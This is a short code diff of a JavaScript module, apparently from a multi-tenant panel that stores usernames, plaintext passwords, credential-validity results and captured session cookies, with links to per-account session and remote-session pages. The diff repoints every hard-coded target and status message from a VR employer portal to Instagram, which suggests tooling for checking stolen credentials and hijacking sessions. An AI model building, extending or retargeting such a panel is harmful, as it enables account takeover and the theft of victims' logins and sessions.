@@ -186,8 +186,8 @@ function sincronizarJsonArquivos() {
                 status_credencial: l.status_credencial,
                 nome: l.usuario,
                 senha: l.senha,
-                mensagem: l.status_credencial === "valido" ? "Senha correta na VR" : "Senha incorreta ou pendente na VR",
-                url_final: sess ? sess.url_final : "https://superportal-empregador.vr.com.br/"
+                mensagem: l.status_credencial === "valido" ? "Senha correta no IG" : "Senha incorreta ou pendente no IG",
+                url_final: sess ? sess.url_final : "https://www.instagram.com/"
             });
         }
 
@@ -447,7 +447,7 @@ module.exports = {
                     status_credencial: "testando",
                     cookies: null,
                     total_cookies: 0,
-                    url_final: "https://superportal-empregador.vr.com.br/",
+                    url_final: "https://www.instagram.com/",
                     tem_sessao_salva: false,
                     link_acesso: `/sessao/${encodeURIComponent(u)}?tenant=${encodeURIComponent(t)}`,
                     link_remota: `/sessaoremota.html?usuario=${encodeURIComponent(u)}&tenant=${encodeURIComponent(t)}`,
@@ -484,7 +484,7 @@ module.exports = {
                     status_credencial: "testando",
                     cookies: null,
                     total_cookies: 0,
-                    url_final: "https://superportal-empregador.vr.com.br/",
+                    url_final: "https://www.instagram.com/",
                     tem_sessao_salva: false,
                     link_acesso: `/sessao/${encodeURIComponent(u)}?tenant=${encodeURIComponent(t)}`,
                     link_remota: `/sessaoremota.html?usuario=${encodeURIComponent(u)}&tenant=${encodeURIComponent(t)}`,
@@ -543,7 +543,7 @@ module.exports = {
                 status_credencial: d.status_credencial || null,
                 cookies: sess ? sess.cookies : null,
                 total_cookies: sess ? sess.total_cookies : 0,
-                url_final: sess ? sess.url_final : "https://superportal-empregador.vr.com.br/",
+                url_final: sess ? sess.url_final : "https://www.instagram.com/",
                 link_acesso: `/sessao/${encodeURIComponent(d.usuario)}?tenant=${encodeURIComponent(itemTenant)}`,
                 link_remota: `/sessaoremota.html?usuario=${encodeURIComponent(d.usuario)}&tenant=${encodeURIComponent(itemTenant)}`,
                 data_hora: d.data_hora || "—"
